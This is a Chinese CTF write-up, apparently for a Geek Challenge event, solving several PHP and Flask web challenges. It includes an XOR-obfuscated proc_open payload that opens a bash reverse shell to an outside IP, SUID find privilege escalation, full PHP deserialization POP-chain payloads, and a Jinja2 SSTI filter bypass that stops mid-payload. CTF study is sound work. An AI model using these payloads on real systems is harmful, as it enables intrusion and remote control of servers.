<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=(%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff)();</span><br></pre></td></tr></table></figure>

<p>发现ban了绝大多数命令执行函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec,system,fwrite,passthru,popen,shell_exec,error_log,fputs,file_get_contents,assert,call_user_func,call_user_func_array,array_map,array_filter,array_reduce,get_defined_vars,getallheaders</span><br></pre></td></tr></table></figure>

<p>但还剩一个proc_open。</p>
<p>根据php手册的内容：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  <span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line">  <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入 </span></span><br><span class="line">  <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容 </span></span><br><span class="line">  <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//标准输出错误 </span></span><br><span class="line">);  </span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容 stream_get_contents — 读取资源流到一个字符串</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们需要构造的payload为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proc_open(&quot;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.108.89.135/2333 0&gt;&amp;1&quot;&quot;,$array,$pipes);</span><br><span class="line">print_r(stream_get_contents($pipes[1]));</span><br></pre></td></tr></table></figure>

<p>经过变量替换：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=$a[]=&quot;pipe&quot;;$a[]=&quot;r&quot;;$aa[]=&quot;pipe&quot;;$aa[]=&quot;w&quot;;$aaa[]=$a;$aaa[]=$aa;$aaa[]=$aa;$_=&quot;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.108.89.135/2333 0&gt;&amp;1&quot;&quot;;$__=proc_open($_,$aaa,$___);print_r(stream_get_contents($___[1]));</span><br></pre></td></tr></table></figure>

<p>经过异或操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=$a[]=(%8f%96%8f%9a^%ff%ff%ff%ff);$a[]=(%8d^%ff);$aa[]=(%8f%96%8f%9a^%ff%ff%ff%ff);$aa[]=(%88^%ff);$aaa[]=$a;$aaa[]=$aa;$aaa[]=$aa;$_=(%9d%9e%8c%97%df%d2%9c%df%dd%9d%9e%8c%97%df%d2%96%df%c1%d9%df%d0%9b%9a%89%d0%8b%9c%8f%d0%cb%c8%d1%ce%cf%c7%d1%c7%c6%d1%ce%cc%ca%d0%cd%cc%cc%cc%df%cf%c1%d9%ce%dd^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff);$__=(%8f%8d%90%9c%a0%90%8f%9a%91^%ff%ff%ff%ff%ff%ff%ff%ff%ff)($_,$aaa,$___);(%8f%8d%96%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff)((%8c%8b%8d%9a%9e%92%a0%98%9a%8b%a0%9c%90%91%8b%9a%91%8b%8c^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff)($___[(%ce^%ff)]));</span><br></pre></td></tr></table></figure>

<p>我们打入payload进行反弹shell，但是当我们cat &#x2F;flag 的时候提示我们Permission denied没有权限，就要进行提权。<a target="_blank" rel="noopener" href="https://blog.csdn.net/Fly_hps/article/details/80428173">https://blog.csdn.net/Fly_hps/article/details/80428173</a></p>
<p>利用命令查找系统上运行的所有SUID可执行文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br></pre></td></tr></table></figure>

<p>我们进行find提权：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec cat /flag \;</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>
<p>SYC{ThE_RCe is S0 Eas1ly_DD!}</p>
<h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><p>又臭又长的反序列化。</p>
<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>刚开始就来了个下马威：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$user</span>)) &#123;</span><br></pre></td></tr></table></figure>

<p>不能以Oa开头，假如不ban掉a的话，我们可以在a数组里面放上我们的恶意对象，也可以反序列化，但是ArrayObject，（此方法只在php版本8.0以下适用）他是C开头的，并且可以绕过O，然后还可以带属性反序列化，符合条件，因此可以构造payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>整段代码可以分为两部分，第一部分是做题部分，但是需要密钥，第二部分是拿取密钥部分，这里有很多小知识点。</p>
<p>在useless类中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;QW))&lt;<span class="number">80</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;YXX)&lt;<span class="number">80</span>)&#123;</span><br><span class="line">                <span class="variable">$bool</span>=!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;QW)&amp;&amp;!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;YXX)&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;QW) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;YXX)) &amp;&amp; (<span class="variable language_">$this</span>-&gt;QW != <span class="variable language_">$this</span>-&gt;YXX) <span class="keyword">and</span> <span class="variable">$random</span>===<span class="string">&#x27;newbee&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$bool</span>)&#123;</span><br></pre></td></tr></table></figure>

<p>我们需要传入QW和YXX的值，让他俩值不相等，但是MD5加密相等，这种MD5加密强比较，第一反应应该是数组绕过，但是这里把数组ban了，第二反应是碰撞，但是找遍全网也找不到80个字符以下的两个md5相等的字符串，查询资料，发现还有第三种方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NAN代表非数值的特殊值，用于指示某个值不是数字</span><br><span class="line">NAN与其他数值进行比较的结果总是不相等的，包括自身在内</span><br></pre></td></tr></table></figure>

<p>所以将QW和YXX均赋值为NAN即可绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关于这个的问题and $random===&#x27;newbee&#x27;;</span><br></pre></td></tr></table></figure>

<p>这里是一个随机数字，但是要等于一个字符串，显然不可能，其实这里不用管，因为赋值符号‘&#x3D;’的优先级大于and，所以他会被忽略。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/key\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/HTTP/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>])===<span class="string">&#x27;key.php&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;找到了！但好像不能直接使用，怎么办，我好想她&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>然后我们需要传入一个a，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">案例网址：https://www.shawroot.cc/php/index.php/test/foo?username=root</span><br><span class="line">$_SERVER[&#x27;PHP_SELF&#x27;] 	得到：/php/index.php/test/foo</span><br><span class="line">$_SERVER[&#x27;REQUEST_URI&#x27;] 得到：/php/index.php/test/foo?username=root</span><br></pre></td></tr></table></figure>

<p>$_SERVER[‘REQUEST_URI’]又不能存在key.php，所以我们传入a&#x3D;PHP_SELF</p>
<p>然后在当前的url网址后面加上&#x2F;key.php即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://e3kdaoip15ici39mafpbux8qb.node.game.sycsec.com/havefun.php</span><br><span class="line">改为</span><br><span class="line">https://e3kdaoip15ici39mafpbux8qb.node.game.sycsec.com/havefun.php/key.php</span><br></pre></td></tr></table></figure>

<p>最终的php代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>=NAN;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>=NAN;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">useless</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://e3kdaoip15ici39mafpbux8qb.node.game.sycsec.com/havefun.php/key.php?user=C%3A13%3A%22ArrayIterator%22%3A89%3A&#123;x%3Ai%3A0%3BO%3A7%3A%22useless%22%3A3%3A&#123;s%3A15%3A%22%00useless%00seeyou%22%3BN%3Bs%3A2%3A%22QW%22%3Bd%3ANAN%3Bs%3A3%3A%22YXX%22%3Bd%3ANAN%3B&#125;%3Bm%3Aa%3A0%3A&#123;&#125;&#125;&amp;a=PHP_SELF</span><br></pre></td></tr></table></figure>

<p>拿到了一大串base64加密后的东西，拿去解密之后发现是图片，查看图片找到密钥</p>
<p>key&#x3D;9</p>
<p>hername&#x3D;momo</p>
<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>分析pop链，在her 类中，找到我们的终点：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;fun&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>应该是php原生类读文件，我们一步一步从终点反推：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>,<span class="string">&#x27;r&#x27;</span>) === <span class="string">&quot;loveyou&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>这里可以用data伪协议进入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,bG92ZXlvdQ==</span><br></pre></td></tr></table></figure>

<p>然后需要密钥和她的名字：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">encode</span>(<span class="variable">$this</span>-&gt;hername,<span class="variable">$this</span>-&gt;key) === <span class="string">&#x27;vxvx&#x27;</span>) &#123;</span><br></pre></td></tr></table></figure>

<p>我们需要在另一部分去拿。</p>
<p>然后以上这些东西都在find这个方法里，我们需要进入这个方法，并且因为里面使用了$this，所以只能动态调用该方法，这个后面说。</p>
<p>找到唯一可以调用函数的地方：</p>
<p>useless类中有get方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are good,你快找到我爱的那个她了&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$zhui</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$good</span>;  </span><br><span class="line">        <span class="variable">$zhui</span>[<span class="variable">$good</span>]();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而能触发get方法的是important类中的sleep方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;睡饱了，接着找！&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;seeyou;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在直接获取私有成员属性得时候，自动调用了这个__get()方法，这里的seeyou是私有属性，所以会调用get，进入get之后，$good就是触发get方法的属性名，即seeyou，所以get当中关键句就变成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seeyou[seeyou]();</span><br></pre></td></tr></table></figure>

<p>我们需要修改seeyou这个数组当中的seeyou的键值，从而调用find函数。</p>
<p>原来尝试过静态调用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$seeyou</span>=[<span class="string">&quot;seeyou&quot;</span>=&gt;<span class="string">&quot;her::find&quot;</span>];</span><br></pre></td></tr></table></figure>

<p>但是不成功，只能动态调用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$seeyou</span>=[<span class="string">&quot;seeyou&quot;</span>=&gt;[<span class="keyword">new</span> <span class="title function_ invoke__">her</span>(), <span class="string">&quot;find&quot;</span>]];</span><br></pre></td></tr></table></figure>

<p>接着回到链子，现在需要触发sleep方法，当序列化的时候会自动触发，在her类中有序列化函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;好累，好想睡一觉啊&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在需要进入invoke方法，当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。在Me类中找到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;qwe;        </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br></pre></td></tr></table></figure>

<p>而wakeup会自动执行。</p>
<p>所以我们的pop链就出来了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Me()-&gt;__wakeup()-&gt;new her()-&gt;__invoke()-&gt;new important()-&gt;__sleep()-&gt;new useless()-&gt;__get()-&gt;new her()-&gt;find()</span><br></pre></td></tr></table></figure>

<p>最终php代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span> = <span class="string">&#x27;momo&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span> = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$seeyou</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seeyou = <span class="variable">$seeyou</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Me</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;bro = &amp;<span class="variable">$b</span>-&gt;secret;</span><br><span class="line"><span class="variable">$b</span>-&gt;qwe = <span class="keyword">new</span> <span class="title function_ invoke__">her</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwe-&gt;asd = <span class="keyword">new</span> <span class="title function_ invoke__">important</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwe-&gt;asd-&gt;power = <span class="keyword">new</span> <span class="title function_ invoke__">useless</span>([<span class="string">&quot;seeyou&quot;</span>=&gt;[<span class="keyword">new</span> <span class="title function_ invoke__">her</span>(), <span class="string">&quot;find&quot;</span>]]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>最后是原生类读文件，当我们想要读取到某个文件时，我们就可以利用SplFileInfo或者SplFileObject类来对文件进行操作。这内置类也只能读取第一行，同样我们可以使用foreach把它们全部都打印出来。</p>
<p>但是这里我们可没有foreach函数可以用，只能读取文件名，所以尝试目录遍历</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62422842/article/details/125045832">https://blog.csdn.net/m0_62422842/article/details/125045832</a></p>
<p>我们用FilesystemIterator扫描一下当前目录第一个文件（只能第一个&#x3D;-&#x3D;）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fun=/var/www/html/</span><br><span class="line">ctf=FilesystemIterator</span><br></pre></td></tr></table></figure>

<p>拿到一个文件名flag_my_baby.php ，打开康康，找到flag</p>
<p>SYC{jUHzFBdyEKq2lySHks}</p>
<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?user=C%3A13%3A%22ArrayIterator%22%3A366%3A%7Bx%3Ai%3A0%3BO%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D%3Bm%3Aa%3A0%3A%7B%7D%7D&amp;file=data://text/plain;base64,bG92ZXlvdQ==&amp;fun=/var/www/html/</span><br><span class="line"></span><br><span class="line">POST：ctf=FilesystemIterator</span><br></pre></td></tr></table></figure>





<h2 id="klf-2-klf-3"><a href="#klf-2-klf-3" class="headerlink" title="klf_2&amp;klf_3"></a>klf_2&amp;klf_3</h2><p>klf_2的payload复制到klf_3里同样适用&#x3D;-&#x3D;</p>
<p>在&#x2F;robots.txt里找到&#x2F;secr3ttt</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584">https://xz.aliyun.com/t/9584</a></p>
<p>这道题过滤了很多关键字，经过测试，留下一个列表可以让我们取用需要的字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set orglst = (&#123; &#125;|select|string|list) %&#125;&#123;&#125;orglst&#125;&#125;</span><br><span class="line">在这里取到下划线和空格</span><br></pre></td></tr></table></figure>

<p>可以通过下列语句构造关键字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;    # popen</span><br></pre></td></tr></table></figure>

<p>直接上payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set po = dict(po=aa,p=b)|join %&#125;             #pop</span><br><span class="line">pop被过滤了，构造出pop后用|attr(po)代替 .pop</span><br><span class="line">&#123;% set xhx = ((&#123; &#125;|select|string|list)|attr(po)(24)|string) %&#125;      #_</span><br><span class="line">&#123;% set kong = ((&#123; &#125;|select|string|list)|attr(po)(17)|string) %&#125;     #空格</span><br><span class="line">&#123;% set point = ((g|string|list)|attr(po)(6)|string) %&#125;  //g是全局变量，代表flask这个实例 #.</span><br><span class="line">&#123;% set claz= dict(cla=aa,ss=b)|join %&#125;						#class</span><br><span class="line">&#123;%set 